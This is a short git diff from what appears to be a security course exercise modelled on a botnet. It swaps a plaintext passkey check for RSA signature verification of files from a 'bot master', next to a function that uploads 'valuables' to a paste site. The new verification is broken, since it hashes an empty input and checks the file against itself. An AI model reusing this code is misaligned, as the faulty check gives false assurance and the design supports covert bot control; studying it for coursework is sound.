@@ -1,4 +1,7 @@
 import os
+from Crypto.Signature import PKCS1_v1_5
+from Crypto.Hash import SHA256
+from Crypto.PublicKey import RSA
 
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
@@ -33,12 +36,15 @@ def upload_valuables_to_pastebot(fn):
 def verify_file(f):
     # Verify the file was sent by the bot master
     # TODO: For Part 2, you'll use public key crypto here
-    # Naive verification by ensuring the first line has the "passkey"
-    lines = f.split(bytes("\n", "ascii"), 1)
-    first_line = lines[0]
-    if first_line == bytes("Caesar", "ascii"):
+
+    file_key = open("mypublickey.txt", "r").read()
+    key = RSA.importKey (file_key)
+    hashed_file = SHA256.new() #need to put original file here
+    signer = PKCS1_v1_5.new(key)
+    if signer.verify(hashed_file, f):
         return True
-    return False
+    else:
+        return False
 
 def process_file(fn, f):
     if verify_file(f):
